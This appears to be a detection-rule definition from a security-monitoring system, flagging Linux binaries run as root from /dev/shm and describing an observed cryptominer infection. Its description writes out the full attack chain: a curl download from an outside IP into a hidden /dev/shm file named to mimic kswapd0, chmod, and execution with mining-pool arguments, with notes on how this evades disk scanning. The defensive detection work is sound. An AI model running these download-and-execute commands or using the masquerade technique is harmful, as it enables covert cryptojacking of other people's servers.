ruleDefinitions.name: "Execution of a binary located in /dev/shm" (Linux, T1027.002)
ruleDefinitions.description: T1027.002 Obfuscated Files or Information: Software Packing — root executes curl, then chmod, then the dropped binary itself directly from /dev/shm (tmpfs, leaves no disk artefact after reboot and is rarely covered by on-disk AV scanning), named .kswapd0 to masquerade as the legitimate kswapd0 kernel memory-management process. NOTE: the Unix privileged-command audit format only captures the binary path and executing uid, not arguments — the full commands were 'curl -s http://185.220.101.61/kswapd0 -o /dev/shm/.kswapd0', 'chmod +x /dev/shm/.kswapd0', then execution of the binary itself with C2 arguments '-o pool.mining-relay.net:443 -u worker01', confirming a cryptomining payload connecting to a mining pool relay. Any packed/hidden binary executing from /dev/shm or /tmp as root is high-confidence malicious regardless of payload. Kill the process, remove the file, and audit for how root-level command execution was achieved on this database server.
